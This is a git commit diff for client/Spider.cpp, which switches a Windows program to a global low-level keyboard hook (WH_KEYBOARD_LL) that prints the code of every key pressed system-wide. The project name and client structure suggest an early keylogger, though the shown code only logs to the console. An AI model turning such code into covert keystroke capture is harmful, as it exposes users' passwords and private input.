baa5a45abd75a7242fb778b2e4421af27ef2946e
Joseph Barbisan <joseph.barbisan@outlook.com>
2015-10-23 18:03:25 +0200

    Keystroke detection
    through lowlevelkeyboardproc

--- client/Spider.cpp
+++ client/Spider.cpp
@@ -1,7 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <iostream>
-#include "hookDLL.h"
+
 
 typedef LRESULT(*HookFunction)(int, WPARAM, LPARAM);
 
@@ -9,27 +9,38 @@ HHOOK kHook;
 HINSTANCE dllHandle;
 HookFunction hookAddr;
 
-int main() 
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	dllHandle = LoadLibrary(TEXT("hookDLL"));
-	if (!dllHandle)
-		std::cerr << "LoadLibrary error : " << GetLastError() << std::endl;
-
-	hookAddr = (HookFunction)GetProcAddress(dllHandle, "_KeyboardProc@12");
-	if (!hookAddr)
-		std::cerr << "getPRocAddress error : " << GetLastError() << std::endl;
-
-	kHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)hookAddr, dllHandle, NULL);
-	if (!kHook)
-		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
-
-	MSG message;
-	while (GetMessage(&message, NULL, 0, 0)) {
-		TranslateMessage(&message);
-		DispatchMessage(&message);
+	if (nCode >= 0) {
+		std::cout << nCode << std::endl;
+		std::cout << wParam << std::endl;
+		std::cout << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
 	}
-
-	UnhookWindowsHookEx(kHook);
-	return 0;
+	return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
+
+extern "C" int main()
+	{
+	/*	dllHandle = LoadLibrary(TEXT("spiderDLL"));
+		if (!dllHandle)
+			std::cerr << "LoadLibrary error : " << GetLastError() << std::endl;
+
+		hookAddr = (HookFunction)GetProcAddress(dllHandle, "_KeyboardProc@12");
+		if (!hookAddr)
+			std::cerr << "getPRocAddress error : " << GetLastError() << std::endl;*/
+
+		//kHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)hookAddr, dllHandle, 0);
+		kHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+		if (!kHook)
+			std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
+
+		MSG message;
+		while (GetMessage(&message, NULL, 0, 0)) {
+			//std::cout << "code key : " << message.wParam << std::endl;
+			TranslateMessage(&message);
+			DispatchMessage(&message);
+		}
+		UnhookWindowsHookEx(kHook);
+		return 0;
+	}
